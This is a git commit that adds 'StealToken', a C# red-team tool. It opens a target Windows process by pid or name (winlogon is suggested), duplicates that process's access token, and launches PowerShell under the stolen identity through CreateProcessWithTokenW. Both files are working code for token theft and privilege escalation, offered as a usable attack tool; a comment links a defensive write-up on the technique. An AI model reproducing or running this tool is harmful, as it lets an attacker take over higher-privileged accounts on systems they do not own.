befded85d733d007010a8d0f123d7e2af77eb4ee
huskersec <30422513+huskersec@users.noreply.github.com>
2021-11-27 18:11:18 -0500

    Add files via upload

---
+++ StealToken/Program.cs
@@ -0,0 +1,109 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Security.Principal;
+
+
+
+namespace StealToken
+{
+    class Program
+    {
+
+        static void Usage()
+        {
+            
+            Console.WriteLine(".\\StealToken.exe pid=1234");
+            Console.WriteLine(".\\StealToken.exe processname=winlogon");
+
+        }
+
+        //https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
+        public static bool IsAdministrator()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
+
+        static void Main(string[] args)
+        {
+
+            Console.WriteLine("Stealing token...");
+
+            bool isAdmin = IsAdministrator();
+            if (isAdmin.Equals(true))
+            {
+
+                Console.WriteLine("We're admin!");
+
+                //arg parsing taken from https://github.com/GhostPack/SharpWMI
+
+                if (args.Length < 1)
+                {
+                    Usage();
+                    return;
+                }
+
+                var arguments = new Dictionary<string, string>();
+                foreach (string argument in args)
+                {
+                    int idx = argument.IndexOf('=');
+                    if (idx > 0)
+                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
+                }
+
+                if (arguments.ContainsKey("pid"))
+                {
+
+                    int pid = Int32.Parse(arguments["pid"]);
+
+                    Console.WriteLine(pid);
+
+                    Token.TokenOps.TokenTheft(pid);
+
+                }
+
+
+                else if (arguments.ContainsKey("processname"))
+                {
+
+                    string target_proc = arguments["processname"];
+
+                    Console.WriteLine(target_proc);
+
+                    Process[] expProc = Process.GetProcessesByName(target_proc);
+                    int target_pid = expProc[0].Id;
+
+                    Console.WriteLine(target_pid);
+
+                    Token.TokenOps.TokenTheft(target_pid);
+
+                }
+
+                else
+                {
+
+                    Console.WriteLine("not implemented");
+                    Usage();
+                    return;
+
+                }
+
+            }
+
+            else
+            {
+
+                Console.WriteLine("You need to be admin! Exiting...");
+                return;
+
+            }
+        }
+    }
+}
---
+++ StealToken/Token/TokenOps.cs
@@ -0,0 +1,117 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Runtime.InteropServices;
+
+namespace StealToken.Token
+{
+    class TokenOps
+    {
+
+        public enum CreationFlags
+        {
+            DefaultErrorMode = 0x04000000,
+            NewConsole = 0x00000010,
+            NewProcessGroup = 0x00000200,
+            SeparateWOWVDM = 0x00000800,
+            Suspended = 0x00000004,
+            UnicodeEnvironment = 0x00000400,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(
+        uint processAccess,
+        bool bInheritHandle,
+        int processId);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool OpenProcessToken(IntPtr ProcessHandle,
+        UInt32 DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken,
+           uint dwDesiredAccess,
+           IntPtr lpTokenAttributes,
+           uint ImpersonationLevel,
+           uint TokenType,
+           out IntPtr phNewToken);
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken,
+            //UInt32 dwLogonFlags,
+            LogonFlags dwLogonFlags,
+            string lpApplicationName,
+            string lpCommandLine,
+            CreationFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+
+
+        public static void TokenTheft(int pid)
+        {
+
+            //https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b
+
+            IntPtr openProcessRes = OpenProcess(0x001F0FFF, true, pid);
+
+            IntPtr currentToken;
+            bool openProcessToken = OpenProcessToken(openProcessRes, 0x0002, out currentToken);
+
+            IntPtr newToken = IntPtr.Zero;
+            DuplicateTokenEx(currentToken, 0xF01FF, IntPtr.Zero, 2, 2, out newToken);
+            IntPtr env = IntPtr.Zero;
+
+            STARTUPINFO si = new STARTUPINFO();
+            si.wShowWindow = 3;
+            si.cb = Marshal.SizeOf(si);
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            bool cRes = CreateProcessWithTokenW(newToken, LogonFlags.WithProfile, null, @"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe", 0, env, null, ref si, out pi);
+
+        }
+
+    }
+}
